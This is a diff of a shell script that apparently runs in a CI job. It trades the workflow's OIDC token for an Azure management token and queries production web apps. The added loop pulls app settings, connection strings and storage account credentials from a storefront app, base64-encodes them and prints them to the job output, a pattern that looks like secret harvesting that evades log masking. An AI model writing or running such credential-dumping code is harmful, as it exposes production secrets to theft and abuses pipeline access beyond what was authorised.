@@ -8,11 +8,10 @@ export AZURE_SUBSCRIPTION_ID="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5
 OIDC=$(curl -sS -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -H "Accept: application/json; api-version=2.0" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
 ARM=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" --data-urlencode "client_id=$AZURE_CLIENT_ID" --data "grant_type=client_credentials" --data "scope=https://management.azure.com/.default" --data "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=$OIDC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
 say "arm_len=${#ARM}"
-RID="subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
-S=$(curl -sS -m 15 -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "https://management.azure.com/$RID/config/appsettings?api-version=2023-01-01")
-B=$(echo -n "$S" | base64 -w0); say "B64_rep_settings=$B"
-echo "R: $(echo "$S" | head -c 500)"
-# thử cả applicationStack + metadata
-S2=$(curl -sS -m 15 -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "https://management.azure.com/$RID/config/web?api-version=2023-01-01")
-B2=$(echo -n "$S2" | base64 -w0); say "B64_rep_web=$B2"
-say "DONE6"
+RID="subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod"
+for EP in "config/appsettings/list" "config/connectionstrings/list" "config/azurestorageaccounts/list" "siteConfig"; do
+  S=$(curl -sS -m 15 -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "https://management.azure.com/$RID/$EP?api-version=2023-01-01")
+  B=$(echo -n "$S" | base64 -w0); say "B64_${EP//\//_}=$B"
+  echo "== $EP: $(echo "$S" | head -c 400)"
+done
+say "DONE7"
